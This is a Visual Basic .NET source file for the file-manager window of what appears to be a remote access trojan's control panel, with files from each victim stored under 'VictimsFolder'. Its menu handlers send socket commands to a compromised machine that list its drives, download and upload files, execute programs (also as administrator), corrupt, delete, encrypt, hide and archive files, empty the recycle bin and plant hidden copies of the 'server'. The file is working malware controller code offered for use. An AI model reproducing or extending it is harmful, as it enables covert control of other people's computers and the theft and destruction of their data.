Public Class FileManager
    Dim currH As Double = 0.0
    Public sock As Integer
    Dim pk As New TextBox
    Dim RichTextBox2 As New RichTextBox
    Dim fff As New TextBox
    Public DownloadVictimFolder As String
    Public Sub RefreshList()
        Main.S.Send(sock, "FileManager" & Main.Yy & TextBox1.Text)
    End Sub
    Private Sub ListView1_SelectedIndexChanged(sender As System.Object, e As System.EventArgs) Handles ListView1.SelectedIndexChanged
        On Error Resume Next
        If TextBox2.Text = "" Then
            TextBox2.ForeColor = Color.Silver
            TextBox2.Text = "Find"
        End If




        fff.Text = ""
        RichTextBox2.Text = ""
        fff.Text = ListView1.Items.Item(ListView1.FocusedItem.Index).SubItems.Item(0).Text
        Dim aa As String = fff.Text
        Dim aa1 As String = fff.Text
        RichTextBox2.Text = aa.LastIndexOf(".")
        Dim xx1 As String = fff.Text
        RichTextBox2.Text = xx1.Substring(RichTextBox2.Text)

        'MsgBox(RichTextBox2.Text)


        If RichTextBox2.Text = ".png" Then
            ue()
        ElseIf RichTextBox2.Text = ".ico" Then
            ue()
        ElseIf RichTextBox2.Text = ".bmp" Then
            ue()
        ElseIf RichTextBox2.Text = ".gif" Then
            ue()
        ElseIf RichTextBox2.Text = ".jpg" Then
            ue()
        ElseIf RichTextBox2.Text = ".jpeg" Then
            ue()




        Else
            pic1.Image = Nothing
            'pic1.ImageLocation = "IOS\Ls.png"


        End If
    End Sub
    Sub ue()
        pic1.Image = Nothing
        'pic1.ImageLocation = "IOS\Ls.png"
        For Each x As ListViewItem In Main.L1.SelectedItems
            Main.S.Send(sock, "viewimage" & "|BlueEagle|" & TextBox1.Text & ListView1.FocusedItem.Text)
        Next
        pic1.Controls.Add(Label1)
        Label1.Text = ListView1.Items.Item(ListView1.FocusedItem.Index).SubItems.Item(1).Text & vbNewLine + ListView1.Items.Item(ListView1.FocusedItem.Index).SubItems.Item(0).Text

    End Sub
    Public Sub back()
        If TextBox1.Text = "" Then
        Else
            ListView3.Items.Add(TextBox1.Text)
            ListView3.MultiSelect = False
            ListView3.Focus()
            If ListView3.FocusedItem.Index < ListView3.Items.Count + 1 Then
                On Error Resume Next


                ListView3.Items(ListView3.FocusedItem.Index + 1).Selected = True
                ListView3.Items(ListView3.FocusedItem.Index + 1).Focused = True

            End If
        End If

        If TextBox1.Text.Length < 4 Then
            TextBox1.Text = ""
            Main.S.Send(sock, "GetDrives" & Main.Yy)
        Else
            TextBox1.Text = TextBox1.Text.Substring(0, TextBox1.Text.LastIndexOf("\"))
            TextBox1.Text = TextBox1.Text.Substring(0, TextBox1.Text.LastIndexOf("\") + 1)
            RefreshList()
        End If
    End Sub
    Private Sub FileManager_Load(sender As System.Object, e As System.EventArgs) Handles MyBase.Load
        Me.AllowTransparency = True
        Me.TransparencyKey = Me.BackColor
        Me.Location = New Point(Screen.PrimaryScreen.WorkingArea.Size.Width / 2 - Me.Width / 2, Screen.PrimaryScreen.WorkingArea.Size.Height - 725)
        Timer1.Start()

    End Sub
    Private Sub ListView2_DoubleClick(sender As System.Object, e As System.EventArgs) Handles ListView2.DoubleClick
        On Error Resume Next
        System.Diagnostics.Process.Start(Application.StartupPath & "\VictimsFolder\" & TextBox5.Text & "\Download\")
    End Sub

    Private Sub Timer1_Tick(sender As System.Object, e As System.EventArgs) Handles Timer1.Tick
        '898; 35 small
        '898; 712normal
        If currH < 712.0 Then
            currH += 71.2
            Me.Size = New Size(963, currH)

        Else
            Timer1.Stop()

            reForge()
            Exit Sub
        End If

    End Sub
    Sub reForge()
        Me.StartPosition = FormStartPosition.CenterScreen
        Controlx.Start()
    End Sub
    Dim ctrlW As Double = 0.0 '698
    Dim ImageH As Double = 0.0 ' 190
    Private Sub Controls_Tick(sender As System.Object, e As System.EventArgs) Handles Controlx.Tick
        If ctrlW > 740.0 Then
            Controlx.Stop()
            Panel3.BackgroundImage = My.Resources.ControlBox
            imagex.Start()
            Exit Sub

        Else

            ctrlW += 74.1
            Panel3.Size = New Size(ctrlW, 106)


        End If
    End Sub

   
   
    Private Sub imagex_Tick(sender As System.Object, e As System.EventArgs) Handles imagex.Tick
        If ImageH > 189 Then
            imagex.Stop()
            ctrlW = 0.0
            Exp.Start()
            Exit Sub

        Else

            ImageH += 19.0
            Panel1.Size = New Size(241, ImageH)


        End If
    End Sub

    Private Sub Exp_Tick(sender As System.Object, e As System.EventArgs) Handles Exp.Tick
        If ctrlW > 511 Then
            Exp.Stop()
            ctrlW = 0.0
            Downx.Start()
            Exit Sub

        Else

            ctrlW += 51.2
            Panel2.Size = New Size(737, ctrlW)


        End If
    End Sub
    Private Sub Downx_Tick(sender As System.Object, e As System.EventArgs) Handles Downx.Tick
        If ctrlW > 446 Then
            Downx.Stop()

            SendCommand()
            getfolder()
            Exit Sub

        Else

            ctrlW += 44.7
            Panel5.Size = New Size(202, ctrlW)


        End If
    End Sub
    Sub SendCommand()
        TextBox5.Text = Main.L1.Items.Item(Main.L1.FocusedItem.Index).SubItems.Item(0).Text
        If TextBox5.Text.Contains("Windows 10") Then
            TextBox5.Text = TextBox5.Text.Replace("Windows 10", "").Replace(vbNewLine, "")
        End If

        If TextBox5.Text.Contains("Windows 8.1") Then
            TextBox5.Text = TextBox5.Text.Replace("Windows 8.1", "").Replace(vbNewLine, "")
        End If
        If TextBox5.Text.Contains("Windows 7") Then
            TextBox5.Text = TextBox5.Text.Replace("Windows 7", "").Replace(vbNewLine, "")
        End If
        If TextBox5.Text.Contains("Windows Vista") Then
            TextBox5.Text = TextBox5.Text.Replace("Windows Vista", "").Replace(vbNewLine, "")
        End If

        If TextBox5.Text.Contains("Windows XP") Then
            TextBox5.Text = TextBox5.Text.Replace("Windows XP", "").Replace(vbNewLine, "")
        End If

        If TextBox5.Text.Contains("Uinux[MAC][iOS]") Then
            TextBox5.Text = TextBox5.Text.Replace("Uinux[MAC][iOS]", "").Replace(vbNewLine, "")
        End If

        If TextBox5.Text.Contains("Unknowen OS ") Then
            TextBox5.Text = TextBox5.Text.Replace("Unknowen OS ", "").Replace(vbNewLine, "")
        End If

        Main.S.Send(sock, "GetDrives") ' Ask Server to Get Drives
    End Sub
    Private Sub Button15_Click(sender As System.Object, e As System.EventArgs) Handles Button15.Click
        On Error Resume Next
        ListView3.Items.Clear()
        For Each x As ListViewItem In Main.L1.SelectedItems
            Main.S.Send(sock, "getdesktoppath")
        Next
    End Sub

    Private Sub Button1_Click(sender As System.Object, e As System.EventArgs) Handles Button1.Click
        On Error Resume Next
        ListView3.Items.Clear()
        For Each x As ListViewItem In Main.L1.SelectedItems
            Main.S.Send(sock, "getstartuppath")
        Next
    End Sub

    Private Sub Button2_Click(sender As System.Object, e As System.EventArgs) Handles Button2.Click
        On Error Resume Next
        ListView3.Items.Clear()
        For Each x As ListViewItem In Main.L1.SelectedItems
            Main.S.Send(sock, "getmydocumentspath")
        Next
    End Sub

    Private Sub Button3_Click(sender As System.Object, e As System.EventArgs) Handles Button3.Click
        On Error Resume Next
        ListView3.Items.Clear()
        For Each x As ListViewItem In Main.L1.SelectedItems
            Main.S.Send(sock, "gettemppath")
        Next
    End Sub

    Private Sub Button4_Click(sender As System.Object, e As System.EventArgs) Handles Button4.Click
        On Error Resume Next
        ListView3.Items.Clear()
        For Each x As ListViewItem In Main.L1.SelectedItems
            Main.S.Send(sock, "getmypicspath")
        Next
    End Sub

    Private Sub Button5_Click(sender As System.Object, e As System.EventArgs) Handles Button5.Click
        On Error Resume Next
        ListView3.Items.Clear()
        For Each x As ListViewItem In Main.L1.SelectedItems
            Main.S.Send(sock, "getmusicspath")
        Next
    End Sub
    Private Sub TextBox2_MouseLeave(sender As System.Object, e As System.EventArgs) Handles TextBox2.MouseLeave
        If TextBox2.Text = "" Then
            TextBox2.ForeColor = Color.Silver
            TextBox2.Text = "Find"
        End If

    End Sub

    Private Sub buttonClos_Click(sender As System.Object, e As System.EventArgs) Handles buttonClos.Click
        Me.Close()
    End Sub

   
    Private Sub Button6_Click(sender As System.Object, e As System.EventArgs) Handles Button6.Click
        back()
    End Sub
    Private Sub TextBox2_TextChanged(sender As System.Object, e As System.EventArgs) Handles TextBox2.TextChanged
        If TextBox2.Text = "" Then
            TextBox2.ForeColor = Color.Lime

        End If
    End Sub

    Private Sub TextBox2_KeyPress(sender As System.Object, e As System.Windows.Forms.KeyPressEventArgs) Handles TextBox2.KeyPress
        On Error Resume Next
        If e.KeyChar = Chr(Keys.Back) Then

            RefreshList()
        Else


            For Each item As ListViewItem In ListView1.Items
                If Not item.SubItems(0).Text.ToLower.Contains(TextBox2.Text.ToLower) Then
                    item.Remove()
                End If
            Next
        End If






    End Sub

    Private Sub RefreshToolStripMenuItem_Click(sender As System.Object, e As System.EventArgs) Handles RefreshToolStripMenuItem.Click
        RefreshList()
    End Sub

    Private Sub OpToolStripMenuItem_Click(sender As System.Object, e As System.EventArgs) Handles OpToolStripMenuItem.Click
        'open downloads
        For Each folder In IO.Directory.GetDirectories(Application.StartupPath & "\VictimsFolder\")
            If folder.Contains(TextBox5.Text) Then
                Process.Start(folder)
                DownloadVictimFolder = folder
                Me.ContextMenuStrip1.Items(13).Enabled = True
                Exit Sub
            End If
        Next
        '   Dim path = (Application.StartupPath & "\VictimsFolder\" & TextBox5.Text & "\Download\")

    End Sub

    Private Sub ListView1_DoubleClick(sender As System.Object, e As System.EventArgs) Handles ListView1.DoubleClick
        On Error Resume Next
        If ListView1.FocusedItem.ImageIndex = 0 Or ListView1.FocusedItem.ImageIndex = 1 Or ListView1.FocusedItem.ImageIndex = 2 Then
            If TextBox1.Text.Length = 0 Then
                TextBox1.Text += ListView1.FocusedItem.Text
            Else
                TextBox1.Text += ListView1.FocusedItem.Text & "\"
            End If
            RefreshList()
        End If

    End Sub

    Private Sub RunAsAdministratorToolStripMenuItem_Click(sender As System.Object, e As System.EventArgs) Handles RunAsAdministratorToolStripMenuItem.Click
        Main.S.Send(sock, "Exletn" & Main.Yy & TextBox1.Text & ListView1.FocusedItem.Text)

    End Sub

    Private Sub RunToolStripMenuItem_Click(sender As System.Object, e As System.EventArgs) Handles RunToolStripMenuItem.Click
        Main.S.Send(sock, "Execute" & Main.Yy & TextBox1.Text & ListView1.FocusedItem.Text)
    End Sub

    Private Sub PlayMusicInHiddenToolStripMenuItem_Click(sender As System.Object, e As System.EventArgs) Handles PlayMusicInHiddenToolStripMenuItem.Click
        For Each x As ListViewItem In Main.L1.SelectedItems
            Main.S.Send(sock, "playmusic" & Main.Yy & TextBox1.Text & ListView1.FocusedItem.Text)
        Next
    End Sub

    Private Sub SetAsWallpaperToolStripMenuItem_Click(sender As System.Object, e As System.EventArgs) Handles SetAsWallpaperToolStripMenuItem.Click
        For Each x As ListViewItem In Main.L1.SelectedItems
            Main.S.Send(sock, "setaswallpaper" & Main.Yy & TextBox1.Text & ListView1.FocusedItem.Text)
        Next
    End Sub

    Private Sub CrypteDecryptTextToolStripMenuItem_Click(sender As System.Object, e As System.EventArgs) Handles CrypteDecryptTextToolStripMenuItem.Click
        Main.S.Send(sock, "EMNS" & Main.Yy & TextBox1.Text & ListView1.FocusedItem.Text)
        RefreshList()
    End Sub

    Private Sub DecryptToolStripMenuItem_Click(sender As System.Object, e As System.EventArgs) Handles DecryptToolStripMenuItem.Click
        Main.S.Send(sock, "EMNqS" & Main.Yy & TextBox1.Text & ListView1.FocusedItem.Text)
        RefreshList()
    End Sub

    Private Sub CompressRARToolStripMenuItem_Click(sender As System.Object, e As System.EventArgs) Handles CompressRARToolStripMenuItem.Click
        If ListView1.FocusedItem.Text.Contains(" ") Then
            Dim purex As String = ListView1.FocusedItem.Text.Replace(" ", "")
            Main.S.Send(sock, "Rename|BlueEagle|File|BlueEagle|" & TextBox1.Text & ListView1.FocusedItem.Text & "|BlueEagle|" & purex)
        End If
        RefreshList()
        For Each x As ListViewItem In Main.L1.SelectedItems
            'PAth textbox1 filename.rar  ListView1.FocusedItem.Text
            Main.S.Send(sock, "EIIT" & Main.Yy & TextBox1.Text & ListView1.FocusedItem.Text & Main.Yy & ListView1.FocusedItem.Text)
        Next
        RefreshList()
    End Sub

    Private Sub EmptyRecycleBinToolStripMenuItem_Click(sender As System.Object, e As System.EventArgs) Handles EmptyRecycleBinToolStripMenuItem.Click
        Main.S.Send(sock, "CLLSKXOa")
    End Sub

    Private Sub DestroyFileToolStripMenuItem_Click(sender As System.Object, e As System.EventArgs) Handles DestroyFileToolStripMenuItem.Click
        For Each x As ListViewItem In Main.L1.SelectedItems
            Main.S.Send(sock, "corrupt" & Main.Yy & TextBox1.Text & ListView1.FocusedItem.Text)
        Next
        RefreshList()
    End Sub

    Private Sub DeleteToolStripMenuItem_Click(sender As System.Object, e As System.EventArgs) Handles DeleteToolStripMenuItem.Click
        Select Case ListView1.FocusedItem.ImageIndex
            Case 0 To 1
            Case 2
                Main.S.Send(sock, "Delete" & Main.Yy & "Folder" & Main.Yy & TextBox1.Text & ListView1.FocusedItem.Text)
            Case Else
                Main.S.Send(sock, "Delete" & Main.Yy & "File" & Main.Yy & TextBox1.Text & ListView1.FocusedItem.Text)
        End Select
        RefreshList()
    End Sub

    Private Sub CopyFileToolStripMenuItem_Click(sender As System.Object, e As System.EventArgs) Handles CopyFileToolStripMenuItem.Click
        Main.S.Send(sock, "Cuut" & Main.Yy & TextBox1.Text & ListView1.FocusedItem.Text)
        TextBox4.Text = ListView1.FocusedItem.Text
        pk.Text = "Copy"
        RefreshList()
    End Sub

    Private Sub CutFileToolStripMenuItem_Click(sender As System.Object, e As System.EventArgs) Handles CutFileToolStripMenuItem.Click
        Main.S.Send(sock, "Cuutod" & Main.Yy & TextBox1.Text & ListView1.FocusedItem.Text)
        TextBox4.Text = ListView1.FocusedItem.Text
        pk.Text = "Cut"
        RefreshList()
    End Sub

    Private Sub RenameToolStripMenuItem_Click(sender As System.Object, e As System.EventArgs) Handles RenameToolStripMenuItem.Click
        Dim a As String
        a = InputBox("Enter New Name", "Rename", ListView1.Items.Item(ListView1.FocusedItem.Index).SubItems.Item(0).Text)

        If a <> "" Then
            Select Case ListView1.FocusedItem.ImageIndex
                Case 0 To 1
                Case 2
                    Main.S.Send(sock, "Rename|BlueEagle|Folder|BlueEagle|" & TextBox1.Text & ListView1.FocusedItem.Text & "|BlueEagle|" & a)
                Case Else
                    Main.S.Send(sock, "Rename|BlueEagle|File|BlueEagle|" & TextBox1.Text & ListView1.FocusedItem.Text & "|BlueEagle|" & a)
            End Select
        End If
        RefreshList()
    End Sub

    Private Sub HideFileToolStripMenuItem_Click(sender As System.Object, e As System.EventArgs) Handles HideFileToolStripMenuItem.Click
        On Error Resume Next
        For Each x As ListViewItem In Main.L1.SelectedItems
            Main.S.Send(sock, "hidefolderfile" & Main.Yy & TextBox1.Text & ListView1.FocusedItem.Text)
        Next
    End Sub

    Private Sub ShowFileToolStripMenuItem_Click(sender As System.Object, e As System.EventArgs) Handles ShowFileToolStripMenuItem.Click
        On Error Resume Next
        For Each x As ListViewItem In Main.L1.SelectedItems
            Main.S.Send(sock, "showfolderfile" & Main.Yy & TextBox1.Text & ListView1.FocusedItem.Text)
        Next
    End Sub

    Private Sub CopyAndHideServerHereToolStripMenuItem_Click(sender As System.Object, e As System.EventArgs) Handles CopyAndHideServerHereToolStripMenuItem.Click
        On Error Resume Next
        Main.S.Send(sock, "Cuut" & Main.Yy & TextBox1.Text & ListView1.FocusedItem.Text)
        TextBox4.Text = ListView1.FocusedItem.Text
        pk.Text = "Copy"
        RefreshList()


    End Sub

    Private Sub CopyAndShowServerHereToolStripMenuItem_Click(sender As System.Object, e As System.EventArgs) Handles CopyAndShowServerHereToolStripMenuItem.Click
        On Error Resume Next
        Main.S.Send(sock, "CpoSx" & Main.Yy & TextBox1.Text & ListView1.FocusedItem.Text)
        RefreshList()
    End Sub

    Private Sub PasteFileToolStripMenuItem_Click(sender As System.Object, e As System.EventArgs) Handles PasteFileToolStripMenuItem.Click
        If pk.Text = "Cut" Then
            Main.S.Send(sock, "Cuutodsd" & Main.Yy & TextBox1.Text + TextBox4.Text)
            RefreshList()
        End If

        If pk.Text = "Copy" Then
            Main.S.Send(sock, "dCopsx" & Main.Yy & TextBox1.Text + TextBox4.Text)
            RefreshList()
        End If

    End Sub

    Private Sub UpToolStripMenuItem_Click(sender As System.Object, e As System.EventArgs) Handles UpToolStripMenuItem.Click
        UPload()

    End Sub
    Private Sub UPload()
        Dim o As New OpenFileDialog
        o.ShowDialog()

        If o.FileName.Length > 0 Then
            Dim n As New IO.FileInfo(o.FileName)
            For Each x As ListViewItem In Main.L1.SelectedItems
                Main.S.Send(x.ToolTipText, "sendfileto" & Main.Yy & TextBox1.Text & n.Name & Main.Yy & Convert.ToBase64String(IO.File.ReadAllBytes(o.FileName)))
            Next
        End If

        ListView2.Items.Add("--->To a Path-->" + TextBox1.Text & ") (Name " + o.FileName + ")")
        For Each Process As ListViewItem In ListView2.Items
            If Process.Text.Contains("--->To a Path-->") Then

                Process.ForeColor = Color.CadetBlue

                Process.ImageIndex = 1

            End If
        Next
    End Sub
    Private Sub FolderToolStripMenuItem_Click(sender As System.Object, e As System.EventArgs) Handles FolderToolStripMenuItem.Click
        Dim n As String

        n = InputBox("Enter The folder's Name", "Creat New Folder")
        For Each x As ListViewItem In Main.L1.SelectedItems
            Main.S.Send(sock, "creatnewfolder" & Main.Yy & TextBox1.Text & n)
        Next
        RefreshList()
    End Sub

    Private Sub ViweeditTextFileToolStripMenuItem_Click(sender As System.Object, e As System.EventArgs) Handles ViweeditTextFileToolStripMenuItem.Click
        For Each x As ListViewItem In Main.L1.SelectedItems
            Main.S.Send(sock, "edittextfile" & Main.Yy & TextBox1.Text & ListView1.FocusedItem.Text)
        Next
    End Sub

    Private Sub TextFileToolStripMenuItem_Click(sender As System.Object, e As System.EventArgs) Handles TextFileToolStripMenuItem.Click
        Dim n As String

        n = InputBox("Enter The textfile's Name", "Creat New text file")
        For Each x As ListViewItem In Main.L1.SelectedItems
            Main.S.Send(sock, "creatnewtextfile" & Main.Yy & TextBox1.Text & n & ".txt")
        Next
        RefreshList()
    End Sub

    Private Sub RTFFileToolStripMenuItem_Click(sender As System.Object, e As System.EventArgs) Handles RTFFileToolStripMenuItem.Click
        Dim n As String

        n = InputBox("Enter The rtf File's Name", "Creat New rtf File")
        For Each x As ListViewItem In Main.L1.SelectedItems
            Main.S.Send(sock, "creatnewtextfile" & Main.Yy & TextBox1.Text & n & ".rtf")
        Next
        RefreshList()
    End Sub

    Private Sub LogFileToolStripMenuItem_Click(sender As System.Object, e As System.EventArgs) Handles LogFileToolStripMenuItem.Click
        Dim n As String

        n = InputBox("Enter The log File's Name", "Create New log File")
        For Each x As ListViewItem In Main.L1.SelectedItems
            Main.S.Send(sock, "creatnewtextfile" & Main.Yy & TextBox1.Text & n & ".log")
        Next
        RefreshList()
    End Sub

    Private Sub PropertiesToolStripMenuItem_Click(sender As System.Object, e As System.EventArgs) Handles PropertiesToolStripMenuItem.Click
        On Error Resume Next
        fff.Text = ""
        RichTextBox2.Text = ""
        fff.Text = ListView1.Items.Item(ListView1.FocusedItem.Index).SubItems.Item(0).Text
        Dim aa As String = fff.Text
        Dim aa1 As String = fff.Text
        RichTextBox2.Text = aa.LastIndexOf(".")
        Dim xx1 As String = fff.Text
        RichTextBox2.Text = xx1.Substring(RichTextBox2.Text)
        If RichTextBox2.Text = ".png" Then
        ElseIf RichTextBox2.Text = ".ico" Then
        ElseIf RichTextBox2.Text = ".bmp" Then
        ElseIf RichTextBox2.Text = ".gif" Then
        ElseIf RichTextBox2.Text = ".jpg" Then
        ElseIf RichTextBox2.Text = ".jpeg" Then

        Else
            pic1.Image = Nothing
            'pic1.ImageLocation = "IOS\Ls.png"

        End If
        Dim f As New prop
        If pic1.Image Is Nothing Then
            f.PictureBox1.Image = ImageList1.Images(ListView1.SelectedItems(0).ImageIndex)
        Else
            f.PictureBox1.Image = pic1.Image

        End If

        f.Show()
        f.TextBox3.Text = ListView1.Items.Item(ListView1.FocusedItem.Index).SubItems.Item(1).Text
        f.TextBox4.Text = ListView1.Items.Item(ListView1.FocusedItem.Index).SubItems.Item(0).Text
        f.Text = ListView1.FocusedItem.Text
        f.TextBox2.Text = TextBox1.Text
        f.TextBox6.Text = TextBox1.Text + ListView1.FocusedItem.Text
        f.TopMost = True
        f.TopMost = False
    End Sub
    Sub getfolder()
        For Each folder In IO.Directory.GetDirectories(Application.StartupPath & "\VictimsFolder\")
            If folder.Contains(TextBox5.Text) Then
                DownloadVictimFolder = folder
                Me.ContextMenuStrip1.Items(13).Enabled = True
                Exit Sub
            End If
        Next
    End Sub

    Private Sub DecToolStripMenuItem_Click(sender As System.Object, e As System.EventArgs) Handles DecToolStripMenuItem.Click

      

        For Each x As ListViewItem In Main.L1.SelectedItems
            Main.S.Send(sock, "Decrar" & Main.Yy & TextBox1.Text & ListView1.FocusedItem.Text)
        Next
        RefreshList()
    End Sub
#Region "Drag"

    Dim posX As Integer
    Dim posY As Integer
    Dim drag As Boolean



    Private Sub Header_MouseDown(ByVal sender As Object, ByVal e As System.Windows.Forms.MouseEventArgs) Handles Label4.MouseDown, Label2.MouseDown
        If e.Button = MouseButtons.Left Then
            drag = True
            posX = Cursor.Position.X - Me.Left
            posY = Cursor.Position.Y - Me.Top
        End If
    End Sub

    Private Sub Header_MouseUp(ByVal sender As Object, ByVal e As System.Windows.Forms.MouseEventArgs) Handles Label4.MouseUp, Label2.MouseUp
        drag = False
    End Sub

    Private Sub Header_MouseMove(ByVal sender As Object, ByVal e As System.Windows.Forms.MouseEventArgs) Handles Label4.MouseMove, Label2.MouseMove
        If drag Then
            Me.Top = Cursor.Position.Y - posY
            Me.Left = Cursor.Position.X - posX
        End If
        Me.Cursor = Cursors.Default
    End Sub





#End Region

    Private Sub DownToolStripMenuItem_Click(sender As System.Object, e As System.EventArgs) Handles DownToolStripMenuItem.Click
        For Each x As ListViewItem In Main.L1.SelectedItems

            Main.S.Send(sock, "downloadfile" & "|BlueEagle|" & TextBox1.Text & ListView1.FocusedItem.Text & "|BlueEagle|" & ListView1.FocusedItem.Text)
        Next

    End Sub
End Class